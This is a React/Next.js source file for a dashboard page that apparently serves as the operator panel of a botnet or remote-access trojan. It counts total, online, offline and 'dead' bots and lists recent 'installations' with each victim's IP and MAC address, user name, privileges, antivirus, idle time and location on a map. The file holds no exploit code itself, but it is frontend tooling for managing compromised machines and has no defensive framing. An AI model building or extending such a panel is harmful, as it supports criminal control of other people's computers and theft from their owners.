'use client';
import React, { useEffect, useState } from 'react';

import DataTable from '@/components/DataTable';
import ClientsMap from '@/components/ClientsMap';
import api from '@/lib/api';

const summaryCardStyles = 'rounded-2xl shadow-[0_0_24px_#00ffae55] px-8 py-7 text-center border-2 border-[#00ffae] flex-1 min-w-[180px] flex flex-col items-center justify-center bg-[#23272f] font-sans transition-all duration-300';

const columns = [
  { key: 'id', label: 'BID', sortable: false },
  { key: 'ip', label: 'IP Address', sortable: false },
  { key: 'lan', label: 'LAN', sortable: false },
  { key: 'mac', label: 'MAC Address', sortable: false },
  { key: 'port', label: 'Port', sortable: false },
  { key: 'computerName', label: 'Computer Name', sortable: false },
  { key: 'username', label: 'User Name', sortable: false },
  { key: 'os', label: 'OS', sortable: false },
  { key: 'osType', label: 'OS Type', sortable: false },
  { key: 'osBit', label: 'OS Bit', sortable: false },
  { key: 'country', label: 'Country', sortable: false },
  { key: 'language', label: 'Language', sortable: false },
  { key: 'timezone', label: 'TimeZone', sortable: false },
  { key: 'privileges', label: 'Privileges', sortable: false },
  { key: 'deviceType', label: 'Device Type', sortable: false },
  { key: 'antivirus', label: 'Antivirus', sortable: false },
  { key: 'idle', label: 'Idle', sortable: false },
  { key: 'version', label: 'Version', sortable: false },
  { key: 'tag', label: 'Tag', sortable: false },
  { key: 'note', label: 'Note', sortable: false },
  { key: 'lastSeen', label: 'Last Seen', sortable: false },
];

export default function DashboardHome() {
  const [summary, setSummary] = useState({ total: 0, online: 0, offline: 0, dead: 0 });
  const [installations, setInstallations] = useState<any[]>([]);
  const [topCountries, setTopCountries] = useState<{ country: string, count: number }[]>([]);
  const [mapClients, setMapClients] = useState<any[]>([]);
  const [countryDist, setCountryDist] = useState<{ country: string, count: number }[]>([]);
  const [botsPerDay, setBotsPerDay] = useState<{ date: string, count: number }[]>([]);

  useEffect(() => {
    async function fetchData() {
      // Summary cards
      const stats = await api.get('/dashboard/summary').then(r => r.data.data).catch(() => ({ total: 0, online: 0, offline: 0, dead: 0 }));
      setSummary(stats);
      // Last 5 installations
      const last5 = await api.get('/clients?limit=5&sort=-createdAt').then(r => r.data.data).catch(() => []);
      setInstallations(last5);
      // Top 5 countries
      const countries = await api.get('/dashboard/top-countries').then(r => r.data.data).catch(() => []);
      setTopCountries(countries);
      // Map clients (with lat/lon)
      const geoClients = await api.get('/clients?geolocated=true').then(r => r.data.data).catch(() => []);
      setMapClients(geoClients);
      // Country distribution
      const dist = await api.get('/dashboard/country-distribution').then(r => r.data.data).catch(() => []);
      setCountryDist(dist);
      // Bots per day
      const perDay = await api.get('/dashboard/bots-per-day').then(r => r.data.data).catch(() => []);
      setBotsPerDay(perDay);
    }
    fetchData();
  }, []);

  return (
    <div className="flex min-h-screen bg-[#181a20]">
      
      <main className="flex-1 p-12">
        <h1 className="text-5xl font-bold mb-8 text-blue-300 drop-shadow animate-pulse">Dashboard</h1>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
          <div className={`${summaryCardStyles} border-blue-300 bg-blue-100`}>
            <div className="text-5xl text-[#00ffae]">👤</div>
            <div className="text-4xl font-extrabold text-blue-300 animate-pulse">{summary.total}</div>
            <div className="text-blue-400">TOTAL BOTS</div>
          </div>
          <div className={`${summaryCardStyles} border-green-300 bg-green-100`}>
            <div className="text-5xl text-[#00ffae]">●</div>
            <div className="text-4xl font-extrabold text-green-300 animate-pulse">{summary.online}</div>
            <div className="text-green-400">ONLINE BOTS</div>
          </div>
          <div className={`${summaryCardStyles} border-yellow-300 bg-yellow-100`}>
            <div className="text-5xl text-yellow-300">●</div>
            <div className="text-4xl font-extrabold text-yellow-300 animate-pulse">{summary.offline}</div>
            <div className="text-yellow-400">OFFLINE BOTS</div>
          </div>
          <div className={`${summaryCardStyles} border-red-300 bg-red-100`}>
            <div className="text-5xl text-gray-500">●</div>
            <div className="text-4xl font-extrabold text-red-300 animate-pulse">{summary.dead}</div>
            <div className="text-red-400">DEAD BOTS</div>
          </div>
        </div>

        {/* Last 5 Installations */}
        <div className="bg-blue-100 rounded-lg px-8 py-6 mb-8 shadow border border-blue-300">
          <div className="font-semibold text-blue-300 text-2xl mb-4">Last 5 Installations</div>
          <DataTable columns={columns} data={installations} pageSize={5} />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
          {/* Top 5 Countries */}
          <div className="bg-blue-100 rounded-lg shadow-md p-8 flex flex-col">
            <div className="font-semibold text-blue-300 text-2xl mb-4">Top 5 Countries</div>
            <ul className="space-y-4">
              {topCountries.length === 0 ? (
                <li className="text-gray-400">No data</li>
              ) : topCountries.map((c, i) => (
                <li key={c.country} className="flex items-center gap-4">
                  <span className="text-3xl text-blue-400">🗺️</span>
                  <span className="text-blue-300 font-bold">{c.country}</span>
                  <span className="text-xs text-blue-400">{c.count} bots</span>
                </li>
              ))}
            </ul>
          </div>
          {/* World Map */}
          <div className="bg-blue-100 rounded-lg shadow-md p-8 flex flex-col">
            <div className="font-semibold text-blue-300 text-2xl mb-4">World Map</div>
            <ClientsMap clients={mapClients} />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
          {/* Bots Distribution by Country */}
          <div className="bg-blue-100 rounded-lg shadow-md p-8 flex flex-col">
            <div className="font-semibold text-blue-300 text-2xl mb-4">Bots Distribution by Country</div>
            {/* Placeholder for chart */}
            <div className="w-full h-48 flex items-center justify-center">
              <span className="text-blue-400">[Country Distribution Chart]</span>
            </div>
          </div>
          {/* Bots Per Day (Last 30 days) */}
          <div className="bg-blue-100 rounded-lg shadow-md p-8 flex flex-col">
            <div className="font-semibold text-blue-300 text-2xl mb-4">Bots Per Day (Last 30 days)</div>
            {/* Placeholder for chart */}
            <div className="w-full h-48 flex items-center justify-center">
              <span className="text-blue-400">[Bots Per Day Chart]</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}